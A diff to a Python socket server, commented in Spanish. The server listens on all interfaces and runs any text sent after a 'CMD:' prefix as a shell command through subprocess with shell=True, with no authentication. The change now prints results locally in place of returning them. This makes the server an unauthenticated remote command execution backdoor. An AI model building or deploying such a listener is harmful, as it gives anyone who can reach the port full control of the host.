@@ -4,6 +4,7 @@ import socket
 import threading
 import time
 import struct
+import subprocess
 
 # Configuración del servidor
 HOST = '0.0.0.0'          # Escuchar en todas las interfaces
@@ -28,7 +29,7 @@ def handle_client(client_socket):
             if command.lower() == 'exit':
                 break
             elif command.startswith('CMD:'):
-                execute_command(client_socket, command[4:])
+                execute_command(command[4:]) 
             elif command == 'GET_COMMANDS':
                 send_command_files(client_socket)
             else:
@@ -56,12 +57,17 @@ def send_command_files(client_socket):
     # Enviar señal de finalización
     client_socket.send(struct.pack('I', 0))
 
-def execute_command(client_socket, command):
+def execute_command(command):
     try:
-        result = os.popen(command).read()
-        client_socket.send(result.encode())
+        # Ejecutar el comando en cmd del sistema operativo host
+        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+        if stdout:
+            print(f"Output: {stdout.decode()}")
+        if stderr:
+            print(f"Error: {stderr.decode()}")
     except Exception as e:
-        client_socket.send(str(e).encode())
+        print(f"Error ejecutando comando: {str(e)}")
         
 def main():
     if not os.path.exists(COMMANDS_FOLDER):
